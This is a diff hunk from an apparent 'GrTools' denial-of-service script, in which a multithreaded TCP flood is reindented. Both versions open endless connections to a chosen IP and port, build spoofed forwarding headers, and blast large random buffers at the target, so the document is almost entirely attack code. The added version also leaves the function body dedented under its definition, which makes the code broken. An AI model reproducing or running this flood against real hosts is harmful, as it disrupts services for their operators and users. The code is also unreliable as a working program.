@@ -165,56 +165,56 @@ method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods 
 if method == "TCP":
 
     def tcpfl():
-        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-        referer = "Referer: " + random.choice(https) + ip + "\r\n"
-        connection = "Connection: Keep-Alive\r\n" + "\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        socks = "socks5: " + random.choice(socks5) + "\r\n"
-        length = "Content-Length: 0\r\n"
-        forward = "X-Forwarded-For: 1\r\n"
-        forwards = "Client-IP: " + ip + "\r\n"
-        accept = random.choice(useragents) + "\r\n"
-        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
-        httpss = "User-Agent: " + random.choice(https) + "\r\n"
-        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        request = get_host + post_host + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(70404)
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.connect((ip, port))
-                for _ in range(150000):  
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-		    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                sock.close()
-            except Exception as e:
-                print("Exception:", e)
-   
-    threads = []
-    for _ in range(th):
-        if method == "TCP":
-            t = threading.Thread(target=tcpfl)
-            threads.append(t)
-            t.start()
+    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    referer = "Referer: " + random.choice(https) + ip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n" + "\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+    socks = "socks5: " + random.choice(socks5) + "\r\n"
+    length = "Content-Length: 0\r\n"
+    forward = "X-Forwarded-For: 1\r\n"
+    forwards = "Client-IP: " + ip + "\r\n"
+    accept = random.choice(useragents) + "\r\n"
+    mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
+    httpss = "User-Agent: " + random.choice(https) + "\r\n"
+    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+    request = get_host + post_host + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
+    grtools = random._urandom(70404)
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect((ip, port))
+            for _ in range(150000):
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+                sock.send(grtools)
+            sock.close()
+        except Exception as e:
+            print("Exception:", e)
 
-   for thread in threads:
-       thread.join()
+threads = []
+for _ in range(th):
+    if method == "TCP":
+        t = threading.Thread(target=tcpfl)
+        threads.append(t)
+        t.start()
+
+for thread in threads:
+    thread.join()
